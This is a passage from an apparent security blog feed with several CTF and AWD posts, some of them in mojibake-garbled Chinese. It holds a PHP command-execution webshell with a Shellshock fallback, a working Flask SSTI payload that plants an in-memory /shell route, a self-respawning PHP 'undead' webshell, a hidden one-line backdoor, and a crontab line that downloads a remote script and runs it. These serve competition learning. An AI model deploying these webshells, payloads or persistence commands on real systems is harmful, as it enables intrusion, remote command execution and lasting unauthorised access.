class="line">$d&#x3D;explode(&quot;,&quot;,@ini_get(&quot;disable_functions&quot;));</span><br><span class="line">if(empty($d)) &#123;</span><br><span class="line">$d&#x3D;array();</span><br><span class="line">&#125; else &#123;</span><br><span class="line">$d&#x3D;array_map(&#39;trim&#39;,array_map(&#39;strtolower&#39;,$d));</span><br><span class="line">&#125;</span><br><span class="line">return(function_exists($f)&amp;&amp;is_callable($f)&amp;&amp;!in_array($f,$d));</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">function runshellshock($d, $c) &#123;</span><br><span class="line">if (substr($d, 0, 1) &#x3D;&#x3D; &quot;&#x2F;&quot; &amp;&amp; fe(&#39;putenv&#39;) &amp;&amp; (fe(&#39;error_log&#39;) || fe(&#39;mail&#39;))) &#123;</span><br><span class="line">if (strstr(readlink(&quot;&#x2F;bin&#x2F;sh&quot;), &quot;bash&quot;) !&#x3D; FALSE) &#123;</span><br><span class="line">$tmp &#x3D; tempnam(sys_get_temp_dir(), &#39;as&#39;);</span><br><span class="line">putenv(&quot;PHP_LOL&#x3D;() &#123; x; &#125;; $c &gt;$tmp 2&gt;&amp;1&quot;);</span><br><span class="line">if (fe(&#39;error_log&#39;)) &#123;</span><br><span class="line">error_log(&quot;a&quot;, 1);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">mail(&quot;a@127.0.0.1&quot;, &quot;&quot;, &quot;&quot;, &quot;-bv&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">return False;</span><br><span class="line">&#125;</span><br><span class="line">$output &#x3D; @file_get_contents($tmp);</span><br><span class="line">@unlink($tmp);</span><br><span class="line">if ($output !&#x3D; &quot;&quot;) &#123;</span><br><span class="line">print($output);</span><br><span class="line">return True;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return False;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">function runcmd($c) &#123;</span><br><span class="line">$ret&#x3D;0;</span><br><span class="line">$d&#x3D;dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class="line">if(fe(&#39;system&#39;)) &#123;</span><br><span class="line">@system($c,$ret);</span><br><span class="line">&#125; elseif(fe(&#39;passthru&#39;)) &#123;</span><br><span class="line">@passthru($c,$ret);</span><br><span class="line">&#125; elseif(fe(&#39;shell_exec&#39;)) &#123;</span><br><span class="line">print(@shell_exec($c));</span><br><span class="line">&#125; elseif(fe(&#39;exec&#39;)) &#123;</span><br><span class="line">@exec($c,$o,$ret);</span><br><span class="line">print(join(&quot;</span><br><span class="line">&quot;,$o));</span><br><span class="line">&#125; elseif(fe(&#39;popen&#39;)) &#123;</span><br><span class="line">$fp&#x3D;@popen($c,&#39;r&#39;);</span><br><span class="line">while(!@feof($fp)) &#123;</span><br><span class="line">print(@fgets($fp,2048));</span><br><span class="line">&#125;</span><br><span class="line">@pclose($fp);</span><br><span class="line">&#125; elseif(fe(&#39;proc_open&#39;)) &#123;</span><br><span class="line">$p &#x3D; @proc_open($c, array(1 &#x3D;&gt; array(&#39;pipe&#39;, &#39;w&#39;), 2 &#x3D;&gt; array(&#39;pipe&#39;, &#39;w&#39;)), $io);</span><br><span class="line">while(!@feof($io[1])) &#123;</span><br><span class="line">print(@fgets($io[1],2048));</span><br><span class="line">&#125;</span><br><span class="line">while(!@feof($io[2])) &#123;</span><br><span class="line">print(@fgets($io[2],2048));</span><br><span class="line">&#125;</span><br><span class="line">@fclose($io[1]);</span><br><span class="line">@fclose($io[2]);</span><br><span class="line">@proc_close($p);</span><br><span class="line">&#125; elseif(fe(&#39;antsystem&#39;)) &#123;</span><br><span class="line">@antsystem($c);</span><br><span class="line">&#125; elseif(runshellshock($d, $c)) &#123;</span><br><span class="line">return $ret;</span><br><span class="line">&#125; elseif(substr($d,0,1)!&#x3D;&quot;&#x2F;&quot; &amp;&amp; @class_exists(&quot;COM&quot;)) &#123;</span><br><span class="line">$w&#x3D;new COM(&#39;WScript.shell&#39;);</span><br><span class="line">$e&#x3D;$w-&gt;exec($c);</span><br><span class="line">$so&#x3D;$e-&gt;StdOut();</span><br><span class="line">$ret.&#x3D;$so-&gt;ReadAll();</span><br><span class="line">$se&#x3D;$e-&gt;StdErr();</span><br><span class="line">$ret.&#x3D;$se-&gt;ReadAll();</span><br><span class="line">print($ret);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">$ret &#x3D; 127;</span><br><span class="line">&#125;</span><br><span class="line">return $ret;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">$ret&#x3D;@runcmd($r.&quot; 2&gt;&amp;1&quot;);</span><br><span class="line">print ($ret!&#x3D;0)?&quot;ret&#x3D;&#123;$ret&#125;&quot;:&quot;&quot;;</span><br><span class="line">;</span><br><span class="line">&#125;</span><br><span class="line">catch(Exception $e) &#123;</span><br><span class="line">echo &quot;ERROR:&#x2F;&#x2F;&quot;.$e-&gt;getMessage();</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">asoutput();</span><br><span class="line">die();</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œå‚æ•°sæ¥æ”¶æ‰§è¡Œå‘½ä»¤çš„å‚æ•° Â  Â </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$s&#x3D;base64_decode(substr($_POST[&quot;ufbd335828f30f&quot;],2));</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥s=</p><figure class="highlight plain"><figcaption><span>/d "D:\\phpstudy_pro\\WWW\\secret"&"C:\Program Files\7-Zip\7z.exe" x secret.zip -pP4Uk6qkh6Gvqwg3y&echo 378df2c234&cd&echo fb7f8f</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>å¯ä»¥å¾—åˆ°å‹ç¼©å¯†ç ä¸ºP4Uk6qkh6Gvqwg3yã€‚ä¸‹é¢å°±å¯ä»¥è§£å‹beacon keys.ä¸‹é¢éœ€è¦åšçš„å·¥ä½œä¸ºï¼šè·å¾—ç§é’¥ï¼Œé€šè¿‡ç§é’¥è·å¾—AESå¯†é’¥ä»¥æŸ¥çœ‹ä¸teamserverçš„é€šä¿¡å†…å®¹ã€‚éœ€è¦ç”¨åˆ°çš„å·¥å…·åœ¨<br><a href="https://github.com/WBGlIl/CS_Decrypt">https://github.com/WBGlIl/CS_Decrypt</a></p><p>é¦–å…ˆæ˜¯æ ¹æ®ç§é’¥æ–‡ä»¶æ¢å¤RSA KEYã€‚<img src="http://cdn.polowong.top/1633578377113neqkckzh.png?imageslim" alt="paste image">æ ¹æ®RSA KEY æ¢å¤AES KEYï¼Œéœ€è¦çœ‹beaconé€šä¿¡çš„æ•°æ®åŒ…ï¼Œæ ¹æ®csç‰¹æ€§ï¼Œä¸€èˆ¬è¿™ä¸ªå€¼è—åœ¨cookieé‡Œã€‚<img src="http://cdn.polowong.top/1633578510720pypykjsw.png?imageslim" alt="paste image"><img src="http://cdn.polowong.top/16336126404051wc58fdp.png?imageslim" alt="paste image">æ‹¿åˆ°AES KEYä¹‹åï¼Œç»§ç»­åˆ©ç”¨è„šæœ¬è¿˜åŸbeaconè¿”å›çš„å†…å®¹ï¼Œè¿™é‡ŒæŠ“å–çš„æ˜¯submit.phpçš„ç‰¹å¾ã€‚æ ¹æ®CobaltStrikeçš„é€šä¿¡è§„åˆ™ï¼Œbeaconä¼šå‘teamserver POST submit.php?id=xxxï¼ŒPOSTDATAä¸ºAESåŠ å¯†åçš„å†…å®¹ã€‚å°†åŠ å¯†åçš„å†…å®¹å¤åˆ¶å‡ºæ¥ä¹‹åè§£å¯†<img src="http://cdn.polowong.top/163361286315319q01mf9.png?imageslim" alt="paste image"><br>æ³¨æ„éœ€è¦æ˜¯base64æ ¼å¼çš„ï¼Œç„¶åä½¿ç”¨è„šæœ¬è¿›è¡Œè§£å¯†<img src="http://cdn.polowong.top/1633612982627c0it3dfp.png?imageslim" alt="paste image">è§£å¯†åå¾—åˆ°flagã€‚</p><h1 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h1><p>è¿™é¢˜å¤ªæŠ˜ç£¨äººäº†ï¼Œåšäº†å¥½ä¹…æ‰åšå‡ºæ¥ï¼Œå†™wpåˆå†™äº†ä¸€æ®µæ—¶é—´ã€‚é¡ºä¾¿å­¦äº†ä¸‹CSçš„ç®€å•é€šä¿¡è¿‡ç¨‹ï¼Œæ”¶è·è¿˜æ˜¯æœ‰çš„ã€‚<br>å‚è€ƒé“¾æ¥ï¼š<a href="https://blog.csdn.net/qq_43264813/article/details/120560209">https://blog.csdn.net/qq_43264813/article/details/120560209</a><br><a href="https://wbglil.gitbook.io/cobalt-strike/cobalt-strike-yuan-li-jie-shao/cs-mu-biao-shang-xian-guo-cheng#beacon-shu-ju-hui-chuan">https://wbglil.gitbook.io/cobalt-strike/cobalt-strike-yuan-li-jie-shao/cs-mu-biao-shang-xian-guo-cheng#beacon-shu-ju-hui-chuan</a><br><a href="https://www.wkr.moe/ctf/610.html#toc-head-3">https://www.wkr.moe/ctf/610.html#toc-head-3</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Analysis of flask memory webshell</title>
      <link href="2021/09/24/Analysis-of-flask-memory-webshell/"/>
      <url>2021/09/24/Analysis-of-flask-memory-webshell/</url>
      
        <content type="html"><![CDATA[<h1 id="NOTICE"><a href="#NOTICE" class="headerlink" title="NOTICE"></a>NOTICE</h1><p>Before analysis , I assumed that you know the princple of SSTI and now how to find the exploit chain.You should know  url_for.__globals__ could find global variables in current app.</p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>In the previous passage Iâ€™ve introduced memory webshell in flask and implemented it,so in this passage Iâ€™ll analyse the procedure of a web request which request flask and make sense how to generate a memory shell.</p><h1 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h1><p>This is a EXP in Flask SSTI vulnerability which could register a route and execute system command.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](</span><br><span class="line">&quot;app.add_url_rule(</span><br><span class="line">&#39;&#x2F;shell&#39;, </span><br><span class="line">&#39;shell&#39;, </span><br><span class="line">lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)).read()</span><br><span class="line">)</span><br><span class="line">&quot;,</span><br><span class="line">&#123;</span><br><span class="line">&#39;_request_ctx_stack&#39;:url_for.__globals__[&#39;_request_ctx_stack&#39;],</span><br><span class="line">&#39;app&#39;:url_for.__globals__[&#39;current_app&#39;]</span><br><span class="line">&#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>There are some complex functions and variables in the PoC,Iâ€™ll explain it.<br>From SSTI we can reach eval function to execute python command,such as eval(â€œ__import__(â€˜osâ€™).popen(â€˜whoamiâ€™).read()â€)<img src="http://cdn.polowong.top/163249208767051gyctei.png?imageslim" alt="paste image"><br>function add_url_rule() is used for adding route,such as add route in flask app.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add_url_rule(rule, endpoint&#x3D;None, view_func&#x3D;None, provide_automatic_options&#x3D;None, **options)</span><br></pre></td></tr></table></figure><p>Briefly,we can pass parameter to this function to register route and define the handle function.<br>Usually we can pass(â€˜/shellâ€™,â€™shellâ€™,lambda:xxxx_lambda_function_code) to this function to register a route /shell and define the handle founction.<br>In this demo,the lambda function could receive parameter from front-end and execute system command.It looks like this:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">app.add_url_rule(</span><br><span class="line">&#39;&#x2F;shell&#39;, </span><br><span class="line">&#39;shell&#39;, </span><br><span class="line">lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)).read()</span><br><span class="line">)</span><br><span class="line">        </span><br></pre></td></tr></table></figure><p> This lambda function could receive and handle the parameter passed from front-end and execute it.Until now I  didnâ€™t explain variables like request_ctx_stack ã€appã€current_app.</p><p> request_ctx_stack like a stack structure, every web request will be pushed into this stack and pop ã€handle it.<br>So, in this EXP it(request_ctx_stack.top) represents the current request object,just like in your flask appâ€™s every handle function in route to handle the current request!</p><p>request.args.get() is used for get the parameterâ€™s value from front-end,juset need the parameter name and the default value is whoami in this EXP.</p><p>In eval function, we noticed that there is a variable called app, but now we donâ€™t now what is app.But we know that we can pass parameters and values by eval via dict format in python, so we can pass paramater what we used like app,request_ctx_stack.</p><p>We  have analysed  all the EXP, so we can generate a memory webshell now:)<br><img src="http://cdn.polowong.top/1632494776728fam272p6.png?imageslim" alt="paste image">no new route was found in source code:)<img src="http://cdn.polowong.top/1632495118141e8t9fc9j.png?imageslim" alt="paste image"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p> <a href="https://www.mi1k7ea.com/2021/04/07/%E6%B5%85%E6%9E%90Python-Flask%E5%86%85%E5%AD%98%E9%A9%AC/">https://www.mi1k7ea.com/2021/04/07/%E6%B5%85%E6%9E%90Python-Flask%E5%86%85%E5%AD%98%E9%A9%AC/</a><br> <a href="https://segmentfault.com/blog/myflask">https://segmentfault.com/blog/myflask</a><br> <a href="https://www.cnblogs.com/bigox/p/11652859.html">https://www.cnblogs.com/bigox/p/11652859.html</a><br> <a href="https://englndcib.blogspot.com/2021/08/python-lambda.html">https://englndcib.blogspot.com/2021/08/python-lambda.html</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>implementation of memory webshell in flask</title>
      <link href="2021/09/05/webshell-in-flask/"/>
      <url>2021/09/05/webshell-in-flask/</url>
      
        <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>Server-side Template Injection(SSTI)  is a common vulnerability in Flask framework.If the application choosed flask framework and exists SSTI vulnerability,actually easy to be exploited .</p><p>It is easy to be exploited if a SSTI vulnerability were found. In this page ,Iâ€™ll show how to utilize it to inject webshell into memory.In next passage Iâ€™ll explain the procedure of a Flask app receive,understand and execute the command which sent by user.</p><h1 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h1><p>A simple Flask framework web application with SSTI vulnerability as follows:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template_string</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/test&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    template = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;center-content error&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Oops! That page doesn&#x27;t exist.&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            &lt;h3&gt;%s&lt;/h3&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt; </span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span> %(request.args.get(<span class="string">&#x27;name&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p>In this demo , you can enter test directory and pass parameter â€˜nameâ€™ via GET method,which could execute python command by a specific attack payload which generated by SSTI exploit chains.</p><p>Simple SSTI PoC in this demo(webserver launched on my desktop, default ip is 127.0.0.1, port:5000):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:5000&#x2F;test?url&#x3D;&#123;&#123;url_for.__globals__.__builtins__[%27eval%27](%22__import__(%27os%27).popen(%27whoami%27).read()%22)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="http://cdn.polowong.top/1631714973234z6zu44pt.png?imageslim" alt="paste image"><br>This PoC shows that  SSTI vulnerability could execute system command in web page  which based on Flask.But the privilege inherited from the user who launched this application.</p><h1 id="Webshell-injection-in-Flask"><a href="#Webshell-injection-in-Flask" class="headerlink" title="Webshell injection in Flask"></a>Webshell injection in Flask</h1><p>There is a way to inject webshell into flask:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.find the function which responsible for registering route</span><br><span class="line">2.pass paramaters to the function and improt os modules to execute system command</span><br><span class="line">3.expose an API to  execute user-defined system commandso </span><br><span class="line">so here is the Payload</span><br><span class="line"></span><br><span class="line">&#123;&#123;url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;app.add_url_rule(&#39;&#x2F;shell&#39;, &#39;shell&#39;, lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)).read())&quot;,&#123;&#39;_request_ctx_stack&#39;:url_for.__globals__[&#39;_request_ctx_stack&#39;],&#39;app&#39;:url_for.__globals__[&#39;current_app&#39;]&#125;)&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="http://cdn.polowong.top/1631718243223q0ni26nb.png?imageslim" alt="paste image"><br>Above figure shows that a webshell was generated in memory and can be visited via route /shell while pass paramater cmd to execute the system command,default command are whoami.</p><h1 id="End"><a href="#End" class="headerlink" title="End"></a>End</h1><p>In this passage I just show how to use it , but I think the critical problem is analyse the execute logic and try to find some way to fix? or exploit it in a new way:)</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>AWDæ–°æ‰‹çš„ä¸æ­»é©¬åŠæƒé™ç»´æŒæ€è·¯</title>
      <link href="2021/05/29/AWD%E4%B8%8D%E6%AD%BB%E9%A9%AC/"/>
      <url>2021/05/29/AWD%E4%B8%8D%E6%AD%BB%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<blockquote><p>å‚è€ƒé“¾æ¥<br><a href="https://jlkl.github.io/2019/02/08/Web_13/">https://jlkl.github.io/2019/02/08/Web_13/</a><br><a href="https://rmb122.com/2019/04/04/%E5%B9%B2%E6%8E%89-PHP-%E4%B8%8D%E6%AD%BB%E9%A9%AC/">https://rmb122.com/2019/04/04/%E5%B9%B2%E6%8E%89-PHP-%E4%B8%8D%E6%AD%BB%E9%A9%AC/</a><br><a href="https://www.cnblogs.com/Cl0ud/p/13620537.html">https://www.cnblogs.com/Cl0ud/p/13620537.html</a><br><a href="https://zhuanlan.zhihu.com/p/88850561">https://zhuanlan.zhihu.com/p/88850561</a></p></blockquote><h1 id="æ¦‚å¿µ"><a href="#æ¦‚å¿µ" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h1><p>ä¸æ­»é©¬æŒ‡çš„æ˜¯å…¥åˆ°å†…å­˜çš„webshellï¼Œåœ¨PHPä¸­å¯ä»¥ä½¿ç”¨ulinkåˆ é™¤è‡ªèº«æ–‡ä»¶å¹¶å¾ªç¯åˆ›å»ºwebshellã€‚</p><h1 id="ä¸æ­»é©¬åˆ©ç”¨æµç¨‹"><a href="#ä¸æ­»é©¬åˆ©ç”¨æµç¨‹" class="headerlink" title="ä¸æ­»é©¬åˆ©ç”¨æµç¨‹"></a>ä¸æ­»é©¬åˆ©ç”¨æµç¨‹</h1><p>é¦–å…ˆæ ¹æ®webåé—¨æˆ–è€…ä»»ä½•æŒ–æ˜å‡ºæ¥çš„æ¼æ´å°è¯•æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼ˆå¦‚é—ç•™çš„webåé—¨ç­‰ï¼‰ï¼Œé€šè¿‡è¯¥ç±»æ¼æ´æˆåŠŸæ‰§è¡Œå†™å…¥ä¸æ­»é©¬çš„ç³»ç»Ÿå‘½ä»¤å¹¶æ‰§è¡Œè¯¥ä¸æ­»é©¬ã€‚æ¯”å¦‚é€šè¿‡å†…ç½®çš„åé—¨ç›´æ¥system(â€œecho ä¸æ­»é©¬è„šæœ¬å†…å®¹ &gt;/var/www/html;php ä¸æ­»é©¬æ–‡ä»¶å.phpâ€)ã€‚è¿™æ ·å°±ä¼šåœ¨è¯¥ç›®å½•ä¸‹ä¸æ–­ç”Ÿæˆä¸€ä¸ªä¸æ­»é©¬ æ¯”å¦‚.3.phpã€‚é€šè¿‡webshellç®¡ç†å·¥å…·æˆ–è€…ä½¿ç”¨Pythonå†™è„šæœ¬æ‰¹é‡è®¿é—®å»getflagã€‚</p><h1 id="ä¸æ­»é©¬"><a href="#ä¸æ­»é©¬" class="headerlink" title="ä¸æ­»é©¬"></a>ä¸æ­»é©¬</h1><p>è¿™é‡Œå·ä¸ªåˆ«çš„å¸ˆå‚…çš„å›¾å…ˆ<br><img src="http://cdn.polowong.top/1622256277454oiqbb65p.png?imageslim" alt="paste image">ä¸æ­»é©¬ä¸€èˆ¬é•¿è¿™æ ·</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    ignore_user_abort(true);&#x2F;&#x2F;è®¾ç½®ä¸å®¢æˆ·æœºæ–­å¼€æ˜¯å¦ä¼šç»ˆæ­¢è„šæœ¬çš„æ‰§è¡Œï¼Œè¿™é‡Œè®¾ç½®ä¸ºtrueåˆ™å¿½ç•¥ä¸ç”¨æˆ·çš„æ–­å¼€ï¼Œå³ä½¿ä¸å®¢æˆ·æœºæ–­å¼€è„šæœ¬ä»ä¼šæ‰§è¡Œã€‚</span><br><span class="line">    set_time_limit(0);</span><br><span class="line">    unlink(__FILE__);</span><br><span class="line">    $file &#x3D; &#39;.3.php&#39;;</span><br><span class="line">    $code &#x3D; &#39;&lt;?php if(md5($_GET[&quot;pass&quot;])&#x3D;&#x3D;&quot;1a1dc91c907325c69271ddf0c944bc72&quot;)&#123;@eval($_POST[a]);&#125; ?&gt;&#39;;</span><br><span class="line">    &#x2F;&#x2F;pass&#x3D;pass</span><br><span class="line">    while (1)&#123;</span><br><span class="line">        file_put_contents($file,$code);</span><br><span class="line">        system(&#39;touch -m -d &quot;2018-12-01 09:10:12&quot; .3.php&#39;);</span><br><span class="line"> Â  Â  Â  Â usleep(0);</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>è¯¥ä¸æ­»é©¬ä¸æ–­ç”Ÿæˆ.3.phpï¼Œé€šè¿‡è®¿é—®<a href="http://localhost/.3.php?pass=pass">http://localhost/.3.php?pass=pass</a> Â ç„¶åPOST a=system(â€œæƒ³è¦æ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤â€);å³å¯é€šè¿‡ä¸æ­»é©¬å®ç°å‘½ä»¤æ‰§è¡Œã€‚è¿™é‡Œä½¿ç”¨MD5æ˜¯å› ä¸ºé˜²æ­¢åˆ«äººéª‘ç€è‡ªå·±çš„é©¬è¿›å»äº†ï¼ŒMD5ç†è®ºä¸Šä¸å¯é€†ã€‚å¦‚æœä½¿ç”¨pythonæ‰¹é‡getshellçš„è¯å¤§ä½“æ€è·¯å°±æ˜¯</p><p>url=<a href="http://localhost/.3.php?pass=pass">http://localhost/.3.php?pass=pass</a><br>data={â€œaâ€:â€system(&quot;cat /flag&quot;);â€}<br>flag=requests.post(url=url,data=data).textç„¶åurlå˜å˜å°±å¯ä»¥ï¼Œä¸€èˆ¬ä¼šç»´æŠ¤ä¸€ä¸ªåœ°å€æ±  ä»åœ°å€æ± é‡Œé¢å–urlæˆ–è€…å–ç‰¹å¾ï¼ˆå¯èƒ½æŸä¸ªurlå­—æ®µä¸ä¸€æ ·ï¼‰ç›´æ¥æ‰“å°±è¡Œï¼Œå†é…åˆæäº¤flagçš„apiå°±å¯ä»¥å®ç°è‡ªåŠ¨getflagã€‚</p><h1 id="ä¸æ­»é©¬åˆ é™¤"><a href="#ä¸æ­»é©¬åˆ é™¤" class="headerlink" title="ä¸æ­»é©¬åˆ é™¤"></a>ä¸æ­»é©¬åˆ é™¤</h1><p>è¿™é‡Œä¸æ­»é©¬åˆ é™¤æœ‰å‡ ä¸ªæ€è·¯<br>1.shellè„šæœ¬ç›´æ¥åˆ é™¤ä¸æ­»é©¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">while :</span><br><span class="line">do</span><br><span class="line">rm -rf .3.php;</span><br><span class="line">echo &quot;remove success&quot;;</span><br><span class="line">done</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå…¶å®å¯ä»¥æ›´å®Œå–„ä¸€äº›ï¼Œæ¯”å¦‚æŒ‚ä¸Šwhileè‡ªåŠ¨æ£€æµ‹æ–°å¢çš„æ–‡ä»¶ æˆ–è€…é…åˆæ–‡ä»¶ç›‘æ§è„šæœ¬å®ç°æ–°å¢ä¹‹åç›´æ¥è°ƒç”¨å‡½æ•°åˆ é™¤æ–°å¢çš„æ–‡ä»¶ç­‰ç­‰ï¼ˆPythonå®ç°ï¼Œæˆ‘ä¸ä¼šshellï¼‰<br>2.PHPæœåŠ¡é‡å¯ï¼ˆawdç¯å¢ƒå¯èƒ½ä¸å…è®¸ï¼Œå› ä¸ºæƒé™è¾ƒä½ï¼‰<br>service apache2 restart<br>service php restart</p><p>3.æ€ä½æƒé™PHPè¿›ç¨‹<br>php-apache:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">system(&quot;kill &#96;ps -ef | grep httpd | grep -v grep | awk &#39;&#123;print $2&#125;&#39;&#96;&quot;);</span><br></pre></td></tr></table></figure><p>php-fpm:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">system(&quot;kill &#96;ps -ef | grep php-fpm | grep -v grep | awk &#39;&#123;print $2&#125;&#39;&#96;&quot;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="awdæƒé™ç»´æŒ"><a href="#awdæƒé™ç»´æŒ" class="headerlink" title="awdæƒé™ç»´æŒ"></a>awdæƒé™ç»´æŒ</h1><p>AWDçš„æƒé™ç»´æŒå…¶å®å’Œæ™®é€šçš„æƒé™ç»´æŒå·®ä¸å¤šå¸¸ç”¨çš„å¤§æ¦‚æœ‰ crontab sshè½¯è¿æ¥ sshwrapperã€‚<br>è¯¦æƒ…å‚è€ƒ<a href="https://xz.aliyun.com/t/7338%E7%BB%86%E7%9C%8B%E4%BA%86%E4%B8%8B%E8%BF%99%E7%AF%87%E6%96%87%E7%AB%A0">https://xz.aliyun.com/t/7338ç»†çœ‹äº†ä¸‹è¿™ç¯‡æ–‡ç« </a> å‘ç°äº†ä¸€ä¸ªéšè—ä¸€å¥è¯çš„æ–¹æ³•ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e &quot;&lt;?&#x3D;\&#96;\$_POST[cmd]\&#96;?&gt;\r&lt;?&#x3D;&#39;System default page.&#39;;?&gt;&quot; &gt;default.php</span><br></pre></td></tr></table></figure><p>crontabæ·»åŠ è®¡åˆ’ä»»åŠ¡è‡ªåŠ¨å†™ä¸æ­»é©¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * * * * curl http:&#x2F;&#x2F;host&#x2F;sh.sh &gt;&#x2F;tmp&#x2F;.tmp&#x2F;1.sh;chmod u+x &#x2F;tmp&#x2F;.tmp&#x2F;1.sh ; &#x2F;tmp&#x2F;.tmp&#x2F;1.sh</span><br></pre></td></tr></table></figure><p>æœ¬åœ°èµ·ä¸€ä¸ªhttpæœåŠ¡ 